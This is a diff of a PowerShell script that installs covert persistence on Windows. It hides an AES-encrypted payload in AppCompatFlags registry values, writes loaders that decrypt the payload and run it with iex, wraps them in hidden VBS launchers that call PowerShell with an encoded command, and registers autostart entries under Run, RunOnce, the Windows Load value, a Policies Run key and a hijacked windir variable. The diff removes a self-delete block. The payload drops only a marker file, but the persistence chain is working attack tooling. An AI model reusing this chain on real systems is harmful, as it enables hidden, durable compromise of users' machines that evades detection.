@@ -1,16 +1,14 @@
 $plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"
 
-function e($t,$s,$l){$d=New-Object Security.Cryptography.Rfc2898DeriveBytes($l,[Text.Encoding]::UTF8.GetBytes($s),10000);$c=[Security.Cryptography.Aes]::Create();$c.Key=$d.GetBytes(32);$c.IV=$d.GetBytes(16);$x=$c.CreateEncryptor();$b=$x.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($t),0,$t.Length);$x.Dispose();$c.Dispose();$d.Dispose();[Convert]::ToBase64String($b)}
-
-function r($k,$n,$v){if(!(Test-Path $k)){New-Item $k -Force|Out-Null};Set-ItemProperty $k $n $v -Force -EA 0|Out-Null}
+Write-Host "[*] Installing HKCU persistence chains..." -ForegroundColor Cyan
 
 # PRIMARY CHAIN - Store encrypted payload
 $e1=e $plainPayload "StaticSalt1234" "S3cr3tK3y!2024#Showdown"
-r "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" "CacheData" $e1
+Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" "CacheData" $e1
+Write-Host "[PRIMARY] Blob stored in AppCompatFlags\Layers" -ForegroundColor Green
 
 # PRIMARY CHAIN - Loader script
 $l1='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("S3cr3tK3y!2024#Showdown",[Text.Encoding]::UTF8.GetBytes("StaticSalt1234"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" CacheData -EA 0).CacheData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
-$l1|Out-File "$env:TEMP\syshelper.ps1" -Encoding ASCII -Force;(gi "$env:TEMP\syshelper.ps1" -Force).Attributes=6
 $eL1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l1))
 
 # PRIMARY CHAIN - VBS wrapper
@@ -23,19 +21,18 @@ Set-Content $x $vbs -Encoding ASCII -Force;(gi $x -Force).Attributes=6;$v=$x;bre
 $c=if($v){"wscript.exe //B //Nologo `"$v`""}else{"powershell.exe -Exec Bypass -Window Hidden -Enc $eL1"}
 
 # HKCU Triggers
-r "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c
-r "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateHelper" $c
-r "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "TempCleanup" $c
-r "HKCU:\Environment" "windir" $c
-r "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsUpdate" $c
+Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c
+Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateHelper" $c
+Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "TempCleanup" $c
+Set-RegValue "HKCU:\Environment" "windir" $c
+Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsUpdate" $c
 
 # BACKUP CHAIN - Store encrypted payload
 $e2=e $plainPayload "DifferentSalt5678" "BackupKey!2024#DifferentPassword"
-r "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" "CompatData" $e2
+Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" "CompatData" $e2
 
 # BACKUP CHAIN - Loader script
 $l2='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("BackupKey!2024#DifferentPassword",[Text.Encoding]::UTF8.GetBytes("DifferentSalt5678"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" CompatData -EA 0).CompatData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
-$l2|Out-File "$env:TEMP\syshelper_backup.ps1" -Encoding ASCII -Force;(gi "$env:TEMP\syshelper_backup.ps1" -Force).Attributes=6
 $eL2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l2))
 
 # BACKUP CHAIN - VBS wrapper
@@ -45,11 +42,11 @@ $c2=@();for($i=0;$i -lt $eL2.Length;$i+=8){$c2+=$eL2.Substring($i,[Math]::Min(8,
 $v2="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c2 -join '""&""')""`nsh.Run c,0,False"
 Set-Content $bvp $v2 -Encoding ASCII -Force;(gi $bvp -Force).Attributes=6
 $c2e="wscript.exe //B //Nologo `"$bvp`""
+Write-Host "[BACKUP] VBS wrapper: $bvp" -ForegroundColor Green
 
 # BACKUP CHAIN - Triggers
-r "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c2e
-r "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" "Startup" $c2e
-r "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Configuration" $c2e
+Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c2e
+Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" "Startup" $c2e
+Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Configuration" $c2e
 
-# Self-delete
-$m=$MyInvocation.MyCommand.Path;if(Test-Path $m){Start-Job -ScriptBlock{Start-Sleep 5;Remove-Item $using:m -Force -EA 0}|Out-Null}
+Write-Host "[BACKUP] Backup triggers installed" -ForegroundColor Green
